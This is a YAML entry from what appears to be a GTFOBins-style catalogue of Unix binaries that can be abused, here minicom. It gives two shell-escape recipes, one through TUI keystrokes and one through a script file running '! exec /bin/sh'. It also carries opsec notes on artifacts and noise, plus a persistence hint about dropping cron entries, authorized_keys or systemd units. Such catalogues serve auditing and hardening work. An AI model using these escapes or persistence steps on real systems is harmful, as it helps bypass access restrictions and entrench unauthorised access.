---
name: minicom
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: minicom -D /dev/null
  notes: |-
    Start the following command to open the TUI interface, then:

    1. press `Ctrl-A o` and select `Filenames and paths`;
    2. press `e`, type `/bin/sh`, then `Enter`;
    3. Press `Esc` twice;
    4. Press `Ctrl-A k` to drop the shell.

    After the shell, exit with `Ctrl-A x`.
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
    minicom -D /dev/null -S /path/to/temp-file
    reset^J
  notes: After the shell, exit with `Ctrl-A x`.
references:
- https://gtfobins.github.io/gtfobins/minicom/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
